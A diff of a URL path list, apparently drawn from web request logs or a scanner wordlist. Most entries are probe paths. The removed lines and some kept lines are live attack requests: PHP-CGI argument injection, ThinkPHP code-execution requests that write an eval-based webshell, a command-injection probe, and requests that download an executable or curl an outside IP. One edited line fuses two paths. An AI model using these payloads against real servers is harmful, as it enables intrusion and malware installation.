@@ -1,9 +1,6 @@
 ../../proc/
 *
 /
-/ HTTP/1.0\r\nUser-Agent: masscan/1.0 (https:/github.com/robertdavidgraham/masscan)\r\nAccept: */*\r\n\r\nGET / HTTP/1.0\r\nUser-Agent: masscan/1.0 (https:/github.com/robertdavidgraham/masscan)\r\nAccept: */*\r\n\r\nGET /
-/ HTTP/1.1\r\n\r\nGET /
-/ HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\r\nHost: 47.106.202.101\r\n\r\nGET /
 /__phpMyAdmin/index.php
 /_admin/scripts/setup.php
 /_cache/systemSettings
@@ -322,13 +319,7 @@
 /cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;echo%20$((854625-1));echo%20ffffffffffffffff;
 /cgi-bin/mainfunction.cgi
 /cgi-bin/nobody/
-/cgi-bin/nobody/nobody/loginQuick.htm
-/cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
-/cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
-/cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
-/cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
-/cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E
-/cgi-bin/rdfs.cgi
+/cgi-bin/nobody/nobody/loginQuick.htm/cgi-bin/rdfs.cgi
 /cgi-bin/readfile.cgi?query=ADMINID
 /cgi-bin/test-cgi
 /cgi-bin/ViewLog.asp
@@ -494,7 +485,6 @@
 /ftpsync.settings.save
 /ftpsync.settings~
 /FxCodeShell.jsp::$DATA
-/FxCodeShell.jsp?wiew=FxxkMyLie1836710Aa&os=1&address=http:/a46.bulehero.in/download.exe
 /FxCodeShell.jsp/
 /FxCodeShell.jsp%20
 /get_status.cgi
@@ -576,27 +566,14 @@
 /index.jsp
 /index.php
 /index.php?-s
-/index.php?a=fetch&templateFile=public/index&prefix=''&content=%3Cphp%3Efile_put_contents('spread.php','%3C?php%20@eval($_POST%5Bspread%5D);?%3E')
 /index.php?m=admin&c=index&a=login&dosubmit=1
 /index.php?param1=assert&param2=print(md5(57575848371));
 /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
 /index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))}
 /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50
-/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=spread.php&vars%5B1%5D%5B%5D=%3C?php%20@eval($_POST%5Bspread%5D);?%3E
-/index.php?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=spread.php&vars%5B1%5D%5B%5D=%3C?php%20@eval($_POST%5Bspread%5D);?%3E
-/index.php?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=spread.php&vars%5B1%5D%5B1%5D=%3C?php%20@eval($_POST%5Bspread%5D);?%3E
-/index.php?s=index/%5Cthink%5CRequest/input&cacheFile=spread.php&content=%3C?php%20@eval($_POST%5Bspread%5D);?%3E
-/index.php?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=spread.php&content=%3C?php%20@eval($_POST%5Bspread%5D);?%3E
-/index.php?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&cacheFile=spread.php&content=%3C?php%20@eval($_POST%5Bspread%5D);?%3E
 /index.php?xxxxxxxxxxxx_loads=true&xxxxxxxxxxxx_filename=tr
 /index.php/_login/in
-/index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=spread.php&vars%5B1%5D%5B%5D=%3C?php%20@eval($_POST%5Bspread%5D);?%3E
-/index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo%20%3C?php%20@eval($_POST%5Bspread%5D);?%3E%20%3E%3Espread.php
 /index.php/?s=captcha
-/index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo%20%3C?php%20@eval($_POST%5Bspread%5D);?%3E%20%3E%3Espread.php
-/index.php/?s=index/%5Cthink%5CRequest/input&filter=system&data=echo%20%3C?php%20@eval($_POST%5Bspread%5D);?%3E%20%3E%3Espread.php
-/index.php/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=spread.php&content=%3C?php%20@eval($_POST%5Bspread%5D);?%3E
-/index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=echo%20%3C?php%20@eval($_POST%5Bspread%5D);?%3E%20%3E%3Espread.php
 /index.php/2017/06/11/caiqian/
 /index.php/2017/06/11/sumiao
 /index.php/2017/06/13/youhuaban/
@@ -1221,7 +1198,6 @@
 /public/admin/ueditor/dialogs/internal.js
 /Public/home/appjs/Index.js
 /public/index.php
-/public/index.php?s=/Index/%09hink%07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2037.49.226.35/thinkphp
 /public/ly/order.html
 /public/static/.gitignore
 /public/static/js/ueditor/ueditor.config.js
@@ -1310,7 +1286,6 @@
 /sphpMyAdmin/
 /spider.php
 /splash.php
-/spread.php
 /sql/
 /sql/index.php
 /sql/scripts/setup.php
